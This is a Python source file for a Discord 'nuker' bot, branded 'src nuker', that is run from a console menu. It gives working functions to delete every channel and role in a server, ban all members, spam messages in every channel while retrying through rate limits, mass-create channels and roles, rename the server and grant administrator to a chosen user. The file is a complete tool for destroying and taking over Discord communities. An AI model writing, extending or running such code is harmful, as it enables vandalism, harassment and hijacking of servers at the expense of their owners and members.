import discord
from discord.ext import commands
import os
import shutil
import asyncio
import json
import time
import sys

# Setup the bot with necessary intents
intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

# Path to save checkpoints
CHECKPOINT_DIR = "checkpoints"
os.makedirs(CHECKPOINT_DIR, exist_ok=True)


# Utility function to clear the console
def clear_console():
    os.system("cls" if os.name == "nt" else "clear")


# Utility function for gradient text
def gradient_text(text, start_color, end_color):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    def interpolate(start, end, step, max_steps):
        return int(start + (end - start) * step / max_steps)

    gradient_text = ""
    for i, char in enumerate(text):
        r = interpolate(start_r, end_r, i, len(text))
        g = interpolate(start_g, end_g, i, len(text))
        b = interpolate(start_b, end_b, i, len(text))
        gradient_text += f"\033[38;2;{r};{g};{b}m{char}\033[0m"
    return gradient_text


# Utility function for error text
def error_text(text):
    return f"\033[38;2;255;0;0m{text}\033[0m"


# Utility function to center text
def center_text(text):
    terminal_width = shutil.get_terminal_size().columns
    lines = text.split("\n")
    centered_lines = [line.center(terminal_width) for line in lines]
    return "\n".join(centered_lines)


# Utility function for a loading bar
async def loading_bar(total, prefix="", suffix="", length=50, fill="█"):
    for i in range(total + 1):
        percent = ("{0:.1f}").format(100 * (i / float(total)))
        filled_length = int(length * i // total)
        bar = fill * filled_length + "-" * (length - filled_length)
        sys.stdout.write(f"\r{prefix} |{bar}| {percent}% {suffix}")
        sys.stdout.flush()
        await asyncio.sleep(0.05)  # Faster loading bar
    print()


# Display functions
def display_header(ascii_art, start_color, end_color):
    os.system("src nuker")  # Set tab name
    print(gradient_text(center_text(ascii_art), start_color, end_color))


def display_menu(menu_title, menu_options, start_color, end_color, error_message=None):
    clear_console()
    terminal_width = shutil.get_terminal_size().columns
    box_top = "╭" + "─" * (terminal_width - 2) + "╮"
    box_bottom = "╰" + "─" * (terminal_width - 2) + "╯"

    if error_message:
        print(error_text(center_text(error_message)))

    print(gradient_text(center_text(menu_title), start_color, end_color))
    print(gradient_text(box_top, start_color, end_color))
    for option in menu_options:
        print(gradient_text(option.center(terminal_width), start_color, end_color))
    print(gradient_text(box_bottom, start_color, end_color))


def display_main_menu(start_color, end_color, error_message=None):
    ascii_art = """
  ██████  ██▀███   ▄████▄  
▒██    ▒ ▓██ ▒ ██▒▒██▀ ▀█  
░ ▓██▄   ▓██ ░▄█ ▒▒▓█    ▄ 
  ▒   ██▒▒██▀▀█▄  ▒▓▓▄ ▄██▒
▒██████▒▒░██▓ ▒██▒▒ ▓███▀ ░
▒ ▒▓▒ ▒ ░░ ▒▓ ░▒▓░░ ░▒ ▒  ░
░ ░▒  ░ ░  ░▒ ░ ▒░  ░  ▒   
░  ░  ░    ░░   ░ ░        
      ░     ░     ░ ░      
                  ░        
"""
    menu_title = center_text(ascii_art) + center_text("Main Menu")
    menu_options = [
        "1. Channel's ",
        "2. Role's ",
        "3. Misc",
        "4. Exit",
    ]
    display_menu(menu_title, menu_options, start_color, end_color, error_message)


def display_channel_menu(start_color, end_color, error_message=None):
    menu_title = center_text("Channel's")
    menu_options = [
        "1. Create Channels",
        "2. Delete Channels",
        "3. Spam Text in All Channels",
        "4. Back to Main Menu",
    ]
    display_menu(menu_title, menu_options, start_color, end_color, error_message)


def display_role_menu(start_color, end_color, error_message=None):
    menu_title = center_text("Role's")
    menu_options = [
        "1. Create Roles",
        "2. Delete All Roles",
        "3. Give Admin Role to User",
        "4. Back to Main Menu",
    ]
    display_menu(menu_title, menu_options, start_color, end_color, error_message)


def display_misc_menu(start_color, end_color, error_message=None):
    menu_title = center_text("Misc")
    menu_options = [
        "1. Change Server Name",
        "2. Ban All Users",
        "3. Create Checkpoint",
        "4. Load Checkpoint",
        "5. Delete Checkpoint",
        "6. Back to Main Menu",
    ]
    display_menu(menu_title, menu_options, start_color, end_color, error_message)


@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Game(name="Nuked by src"))
    print(f"Bot is ready. Logged in as {bot.user}")
    await menu_loop()


async def menu_loop(error_message=None):
    start_color = (128, 0, 128)  # Purple
    end_color = (0, 0, 255)  # Blue

    while True:
        display_main_menu(start_color, end_color, error_message)
        choice = input(f"{gradient_text('╰───> ', start_color, end_color)}").strip()

        if choice == "4":
            print(gradient_text(center_text("Exiting..."), start_color, end_color))
            await bot.close()
            break
        elif choice == "1":
            await channel_menu(start_color, end_color)
        elif choice == "2":
            await role_menu(start_color, end_color)
        elif choice == "3":
            await misc_menu(start_color, end_color)
        else:
            error_message = "Invalid selection, please choose a valid option."
            await menu_loop(error_message)


async def channel_menu(start_color, end_color, error_message=None):
    while True:
        display_channel_menu(start_color, end_color, error_message)
        choice = input(f"{gradient_text('╰───> ', start_color, end_color)}").strip()

        if choice == "4":
            break
        elif choice == "1":
            await handle_errors(create_channels, start_color, end_color)
        elif choice == "2":
            await handle_errors(delete_channels, start_color, end_color)
        elif choice == "3":
            await handle_errors(spam_text, start_color, end_color)
        else:
            error_message = "Invalid selection, please choose a valid option."
            await channel_menu(start_color, end_color, error_message)


async def role_menu(start_color, end_color, error_message=None):
    while True:
        display_role_menu(start_color, end_color, error_message)
        choice = input(f"{gradient_text('╰───> ', start_color, end_color)}").strip()

        if choice == "4":
            break
        elif choice == "1":
            await handle_errors(create_roles, start_color, end_color)
        elif choice == "2":
            await handle_errors(delete_all_roles, start_color, end_color)
        elif choice == "3":
            await handle_errors(give_admin_role, start_color, end_color)
        else:
            error_message = "Invalid selection, please choose a valid option."
            await role_menu(start_color, end_color, error_message)


async def misc_menu(start_color, end_color, error_message=None):
    while True:
        display_misc_menu(start_color, end_color, error_message)
        choice = input(f"{gradient_text('╰───> ', start_color, end_color)}").strip()

        if choice == "6":
            break
        elif choice == "1":
            await handle_errors(change_server_name, start_color, end_color)
        elif choice == "2":
            await handle_errors(ban_all_users, start_color, end_color)
        elif choice == "3":
            await handle_errors(create_checkpoint, start_color, end_color)
        elif choice == "4":
            await handle_errors(load_checkpoint, start_color, end_color)
        elif choice == "5":
            await handle_errors(delete_checkpoint, start_color, end_color)
        else:
            error_message = "Invalid selection, please choose a valid option."
            await misc_menu(start_color, end_color, error_message)


async def handle_errors(func, start_color, end_color):
    try:
        await func()
    except Exception as e:
        error_message = f"Error: {str(e)}"
        await menu_loop(error_message)


async def select_server():
    servers = bot.guilds
    if not servers:
        raise Exception("The bot is not part of any servers.")

    start_color = (128, 0, 128)  # Purple
    end_color = (0, 0, 255)  # Blue

    clear_console()
    print(
        gradient_text(
            center_text("Select the server you want to perform actions on:"),
            start_color,
            end_color,
        )
    )
    for idx, server in enumerate(servers, start=1):
        print(
            gradient_text(center_text(f"{idx}. {server.name}"), start_color, end_color)
        )

    while True:
        choice = input(
            gradient_text("Enter the number of the server: ", start_color, end_color)
        ).strip()
        if choice.isdigit() and 1 <= int(choice) <= len(servers):
            return servers[int(choice) - 1]
        else:
            print(
                gradient_text(
                    "Invalid selection, please choose a valid option.",
                    (255, 0, 0),
                    (255, 0, 0),
                )
            )


async def create_channels():
    server = await select_server()
    num_channels = int(
        input(
            gradient_text("How many channels to create? ", (128, 0, 128), (0, 0, 255))
        ).strip()
    )
    channel_names = (
        input(
            gradient_text(
                "Enter channel names (comma-separated): ", (128, 0, 128), (0, 0, 255)
            )
        )
        .strip()
        .split(",")
    )
    tasks = [
        server.create_text_channel(channel_names[i % len(channel_names)].strip())
        for i in range(num_channels)
    ]
    await asyncio.gather(*tasks)
    print(
        gradient_text(f"Created {num_channels} channels.", (128, 0, 128), (0, 0, 255))
    )
    await loading_bar(num_channels, prefix="Progress", suffix="Complete", length=50)


async def create_roles():
    server = await select_server()
    num_roles = int(
        input(
            gradient_text("How many roles to create? ", (128, 0, 128), (0, 0, 255))
        ).strip()
    )
    role_names = (
        input(
            gradient_text(
                "Enter role names (comma-separated): ", (128, 0, 128), (0, 0, 255)
            )
        )
        .strip()
        .split(",")
    )
    tasks = [
        server.create_role(name=role_names[i % len(role_names)].strip())
        for i in range(num_roles)
    ]
    await asyncio.gather(*tasks)
    print(gradient_text(f"Created {num_roles} roles.", (128, 0, 128), (0, 0, 255)))
    await loading_bar(num_roles, prefix="Progress", suffix="Complete", length=50)


async def spam_text():
    server = await select_server()
    num_messages = int(
        input(
            gradient_text(
                "How many messages to send in each channel? ",
                (128, 0, 128),
                (0, 0, 255),
            )
        ).strip()
    )
    message = input(
        gradient_text("Enter the message to spam: ", (128, 0, 128), (0, 0, 255))
    ).strip()
    tasks = [
        spam_channel(channel, message, num_messages) for channel in server.text_channels
    ]
    await asyncio.gather(*tasks)
    print(
        gradient_text(
            f"Sent {num_messages} messages in each channel.", (128, 0, 128), (0, 0, 255)
        )
    )
    await loading_bar(num_messages, prefix="Progress", suffix="Complete", length=50)


async def spam_channel(channel, message, num_messages):
    for _ in range(num_messages):
        try:
            await channel.send(message)
            await asyncio.sleep(0.05)  # Shorter delay to speed up
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = e.retry_after
                print(
                    gradient_text(
                        f"Rate limited. Retrying in {retry_after} seconds.",
                        (255, 0, 0),
                        (255, 0, 0),
                    )
                )
                await asyncio.sleep(retry_after)
                await channel.send(message)
            else:
                raise


async def change_server_name():
    server = await select_server()
    new_name = input(
        gradient_text("Enter the new server name: ", (128, 0, 128), (0, 0, 255))
    ).strip()
    await server.edit(name=new_name)
    print(
        gradient_text(f"Server name changed to {new_name}.", (128, 0, 128), (0, 0, 255))
    )
    await loading_bar(1, prefix="Progress", suffix="Complete", length=50)


async def delete_channels():
    server = await select_server()
    confirmation = (
        input(
            gradient_text(
                "Are you sure you want to delete all channels? (y/n): ",
                (128, 0, 128),
                (0, 0, 255),
            )
        )
        .strip()
        .lower()
    )
    if confirmation == "y":
        tasks = [channel.delete() for channel in server.channels]
        await asyncio.gather(*tasks)
        print(
            gradient_text("All channels have been deleted.", (128, 0, 128), (0, 0, 255))
        )
    else:
        print(gradient_text("Channel deletion aborted.", (128, 0, 128), (0, 0, 255)))
    await loading_bar(
        len(server.channels), prefix="Progress", suffix="Complete", length=50
    )


async def ban_all_users():
    server = await select_server()
    confirmation = (
        input(
            gradient_text(
                "Are you sure you want to ban all users? (y/n): ",
                (128, 0, 128),
                (0, 0, 255),
            )
        )
        .strip()
        .lower()
    )
    if confirmation == "y":
        tasks = [
            member.ban(reason="Ban all users command executed")
            for member in server.members
            if member != server.owner and member != bot.user
        ]
        await asyncio.gather(*tasks)
        print(gradient_text("All users have been banned.", (128, 0, 128), (0, 0, 255)))
    else:
        print(gradient_text("Ban all users aborted.", (128, 0, 128), (0, 0, 255)))
    await loading_bar(
        len(server.members), prefix="Progress", suffix="Complete", length=50
    )


async def give_admin_role():
    server = await select_server()
    user_id = int(
        input(
            gradient_text(
                "Enter the user ID to give admin role: ", (128, 0, 128), (0, 0, 255)
            )
        ).strip()
    )
    user = server.get_member(user_id)
    if user:
        permissions = discord.Permissions(administrator=True)
        admin_role = await server.create_role(name="Admin", permissions=permissions)
        await user.add_roles(admin_role)
        print(
            gradient_text(
                f"Admin role given to user: {user.name}", (128, 0, 128), (0, 0, 255)
            )
        )
    else:
        raise Exception("User not found.")
    await loading_bar(1, prefix="Progress", suffix="Complete", length=50)


async def create_checkpoint():
    server = await select_server()
    checkpoint_name = input(
        gradient_text("Enter the checkpoint name: ", (128, 0, 128), (0, 0, 255))
    ).strip()
    checkpoint_data = {"roles": [], "channels": []}

    # Save roles
    checkpoint_data["roles"] = [
        {
            "name": role.name,
            "permissions": role.permissions.value,
            "color": role.color.value,
            "hoist": role.hoist,
            "mentionable": role.mentionable,
        }
        for role in server.roles
        if role.name != "@everyone"
    ]

    # Save channels
    for channel in server.channels:
        channel_data = {
            "name": channel.name,
            "type": str(channel.type),
            "permissions": [
                {
                    "target": overwrite.name,
                    "permissions": perm_overwrite.pair()[0].value,
                    "deny": perm_overwrite.pair()[1].value,
                }
                for overwrite, perm_overwrite in channel.overwrites.items()
            ],
        }
        checkpoint_data["channels"].append(channel_data)

    with open(os.path.join(CHECKPOINT_DIR, f"{checkpoint_name}.json"), "w") as f:
        json.dump(checkpoint_data, f, indent=4)
    print(
        gradient_text(
            f"Checkpoint '{checkpoint_name}' created.", (128, 0, 128), (0, 0, 255)
        )
    )
    await loading_bar(1, prefix="Progress", suffix="Complete", length=50)


async def load_checkpoint():
    server = await select_server()

    # List checkpoints
    checkpoints = [
        f.split(".")[0] for f in os.listdir(CHECKPOINT_DIR) if f.endswith(".json")
    ]
    if not checkpoints:
        raise Exception("No checkpoints available.")

    print(gradient_text("Available checkpoints:", (128, 0, 128), (0, 0, 255)))
    for idx, checkpoint in enumerate(checkpoints, start=1):
        print(
            gradient_text(
                center_text(f"{idx}. {checkpoint}"), (128, 0, 128), (0, 0, 255)
            )
        )

    while True:
        choice = input(
            gradient_text(
                "Enter the number of the checkpoint to load: ",
                (128, 0, 128),
                (0, 0, 255),
            )
        ).strip()
        if choice.isdigit() and 1 <= int(choice) <= len(checkpoints):
            checkpoint_name = checkpoints[int(choice) - 1]
            break
        else:
            print(
                gradient_text(
                    "Invalid selection, please choose a valid option.",
                    (255, 0, 0),
                    (255, 0, 0),
                )
            )

    with open(os.path.join(CHECKPOINT_DIR, f"{checkpoint_name}.json"), "r") as f:
        checkpoint_data = json.load(f)

    # Restore roles
    tasks = [
        server.create_role(
            name=role_data["name"],
            permissions=discord.Permissions(role_data["permissions"]),
            color=discord.Color(role_data["color"]),
            hoist=role_data["hoist"],
            mentionable=role_data["mentionable"],
        )
        for role_data in checkpoint_data["roles"]
    ]
    await asyncio.gather(*tasks)

    # Restore channels
    for channel_data in checkpoint_data["channels"]:
        channel_type = (
            discord.ChannelType.text
            if channel_data["type"] == "text"
            else discord.ChannelType.voice
        )
        new_channel = await (
            server.create_text_channel(channel_data["name"])
            if channel_type == discord.ChannelType.text
            else server.create_voice_channel(channel_data["name"])
        )

        # Restore permissions
        tasks = [
            new_channel.set_permissions(
                discord.utils.get(server.roles, name=perm_data["target"])
                or discord.utils.get(server.members, name=perm_data["target"]),
                overwrite=discord.PermissionOverwrite.from_pair(
                    discord.Permissions(perm_data["permissions"]),
                    discord.Permissions(perm_data["deny"]),
                ),
            )
            for perm_data in channel_data["permissions"]
        ]
        await asyncio.gather(*tasks)

    print(
        gradient_text(
            f"Checkpoint '{checkpoint_name}' loaded.", (128, 0, 128), (0, 0, 255)
        )
    )
    await loading_bar(1, prefix="Progress", suffix="Complete", length=50)


async def delete_checkpoint():
    # List checkpoints
    checkpoints = [
        f.split(".")[0] for f in os.listdir(CHECKPOINT_DIR) if f.endswith(".json")
    ]
    if not checkpoints:
        raise Exception("No checkpoints available.")

    print(gradient_text("Available checkpoints:", (128, 0, 128), (0, 0, 255)))
    for idx, checkpoint in enumerate(checkpoints, start=1):
        print(
            gradient_text(
                center_text(f"{idx}. {checkpoint}"), (128, 0, 128), (0, 0, 255)
            )
        )

    while True:
        choice = input(
            gradient_text(
                "Enter the number of the checkpoint to delete: ",
                (128, 0, 128),
                (0, 0, 255),
            )
        ).strip()
        if choice.isdigit() and 1 <= int(choice) <= len(checkpoints):
            checkpoint_name = checkpoints[int(choice) - 1]
            break
        else:
            print(
                gradient_text(
                    "Invalid selection, please choose a valid option.",
                    (255, 0, 0),
                    (255, 0, 0),
                )
            )

    os.remove(os.path.join(CHECKPOINT_DIR, f"{checkpoint_name}.json"))
    print(
        gradient_text(
            f"Checkpoint '{checkpoint_name}' deleted.", (128, 0, 128), (0, 0, 255)
        )
    )
    await loading_bar(1, prefix="Progress", suffix="Complete", length=50)


async def delete_all_roles():
    server = await select_server()
    confirmation = (
        input(
            gradient_text(
                "Are you sure you want to delete all roles? (y/n): ",
                (128, 0, 128),
                (0, 0, 255),
            )
        )
        .strip()
        .lower()
    )
    if confirmation == "y":
        tasks = [role.delete() for role in server.roles if role.name != "@everyone"]
        await asyncio.gather(*tasks)
        print(gradient_text("All roles have been deleted.", (128, 0, 128), (0, 0, 255)))
    else:
        print(gradient_text("Role deletion aborted.", (128, 0, 128), (0, 0, 255)))
    await loading_bar(
        len(server.roles), prefix="Progress", suffix="Complete", length=50
    )


# Replace 'YOUR_BOT_TOKEN' with your bot's token
bot.run("YOUR_BOT_TOKEN")
